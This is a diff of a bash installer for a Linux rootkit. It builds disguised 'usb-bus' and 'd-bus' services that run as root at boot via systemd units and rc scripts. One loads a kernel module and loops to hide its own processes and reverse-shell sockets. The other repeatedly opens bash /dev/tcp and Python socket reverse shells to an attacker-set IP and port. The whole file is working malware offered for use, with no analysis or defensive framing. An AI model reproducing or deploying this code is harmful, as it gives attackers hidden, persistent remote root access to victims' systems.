@@ -1,59 +1,59 @@
 #!/bin/bash
 
-#--1st systemd service--
+#---------------------------------------------------usb-bus (/var/lib/usb-bus/usb-bus)--------------------------------------------------------
 #that's the script that is gonna insert the usb-bus rootkit module at boot, hide the systemd services and the bash processes
-hiding_script=$(cat << \EOF
+usb_bus_script=$(cat << \EOF
 #!/bin/bash
+
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
 
 insmod /lib/modules/$(uname -r)/kernel/drivers/usb-bus/usb-bus.ko
 
 while true; do
+  #-hide usb-bus and d-bus, which are the scripts that the systemd services execute-
+  #find all the bash processes
+  bash_pids=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
+  read -a bash_array <<<$bash_pids
+  #hide the services
+  for i in ${bash_array[@]}; do
+    cmd=$(cat /proc/$i/cmdline 2>/dev/null)
+    if [ "$?" == "1" ]; then
+      continue
+    fi
+    if [ "$cmd" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmd" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
+      kill -31 $i
+    fi
+  done
 
-#-hide usb-bus and d-bus, which are the scripts that the systemd services execute-
-#find all the bash processes
-bash_pids=$(ps aux | awk '{ if($11 ~ /bash/) print $2 }')
-read -a bash_array <<<$bash_pids
+  #-hide bash shells which our systemd service spawns-
+  #find all the pids
+  pids=$(ps aux | awk '{print $2}')
+  read -a pid_array <<<$pids
 
-#hide the services
-for i in ${bash_array[@]}; do
-  cmd=$(cat /proc/$i/cmdline 2>/dev/null)
-  if [ "$?" == "1" ]; then
-    continue
-  fi
-  if [ "$cmd" == "/bin/bash/var/lib/usb-bus/usb-bus" ] || [ "$cmd" == "/bin/bash/usr/local/share/d-bus/d-bus" ]; then
-    kill -31 $i
-  fi
-done
+  #find all the inodes
+  inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0202000A:270F/) print $10 }')
+  read -a inode_array <<<$inodes
 
-#-hide bash shells which our systemd service spawns-
-#find all the pids
-pids=$(ps aux | awk '{print $2}')
-read -a pid_array <<<$pids
-
-#find all the inodes
-inodes=$(cat /proc/net/tcp | awk '{ if($3 ~ /0150A8C0:270F/) print $10 }')
-read -a inode_array <<<$inodes
-
-#hide the bash shells
-for p in ${pid_array[@]}; do
-  for i in ${inode_array[@]}; do
-    for (( j=0; j <= 2; j=j+1 )); do
-      socket=$(readlink /proc/$p/fd/$j)
-      if [ "socket:[$i]" == "$socket" ]; then
-        kill -31 $p
-      fi
+  #hide the bash shells
+  for p in ${pid_array[@]}; do
+    for i in ${inode_array[@]}; do
+      for (( j=0; j <= 2; j=j+1 )); do
+        socket=$(readlink /proc/$p/fd/$j)
+        if [ "socket:[$i]" == "$socket" ]; then
+          kill -31 $p
+        fi
+      done
     done
   done
-done
 
-sleep 1
+  sleep 1
 
 done
 EOF
 )
 
-#that's the systemd service that's gonna do the hiding
-hiding_service=$(cat << \EOF
+#usb-bus systemd service
+usb_bus_systemd_service=$(cat << \EOF
 [Unit]
 After=multi-user.target
 StartLimitIntervalSec=0
@@ -69,22 +69,34 @@ WantedBy=multi-user.target
 EOF
 )
 
-#--2nd systemd service--
+#-----------------------------------------d-bus (/usr/local/share/d-bus/d-bus)------------------------------------------------------------
 #that's the script that's gonna open the bash connections
-bash_script=$(cat << EOF
+d_bus_bash_script=$(cat << EOF
 #!/bin/bash
 
 while true; do
-
-bash &>/dev/tcp/$ip/$port <&1 &
-sleep 300
-
+  bash &>/dev/tcp/$ip/$port2 <&1 &
+  sleep 300
 done
 EOF
 )
 
-#that's the systemd service that's gonna open the bash connections
-bash_service=$(cat << \EOF
+#that's the script that's gonna open the python connections
+d_bus_python_script=$(cat << EOF
+#!/bin/bash
+
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+while true; do
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port2));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash"]);'
+  sleep 60
+done
+EOF
+)
+
+#d-bus systemd service
+d_bus_systemd_service=$(cat << \EOF
 [Unit]
 After=multi-user.target
 StartLimitIntervalSec=0
@@ -97,5 +109,24 @@ User=root
 
 [Install]
 WantedBy=multi-user.target
+EOF
+)
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------
+#-usb-bus rc service-
+usb_bus_rc_service=$(cat << \EOF
+#!/bin/sh
+
+/var/lib/usb-bus/usb-bus &
+exit 0
+EOF
+)
+
+#-d-bus rc service-
+d_bus_rc_service=$(cat << \EOF
+#!/bin/sh
+
+/usr/local/share/d-bus/d-bus &
+exit 0
 EOF
 )
